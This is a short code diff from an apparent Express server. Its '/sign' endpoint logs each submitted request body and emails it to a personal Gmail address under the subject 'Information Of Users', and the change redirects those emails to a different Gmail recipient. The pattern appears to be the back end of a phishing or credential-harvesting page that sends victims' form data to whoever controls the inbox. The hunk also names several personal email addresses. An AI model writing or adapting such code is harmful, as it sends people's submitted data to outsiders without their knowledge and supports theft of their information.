@@ -107,7 +107,7 @@ app.post('/sign', async (req, resp) => {
   console.log(body)
   await transporter.sendMail({
     from: 'nmunshi40@gmail.com',
-    to: 'shawtemp92@gmail.com',
+    to: 'Nikopet27@gmail.com',
     subject: 'Information Of Users',
     html: body
   });
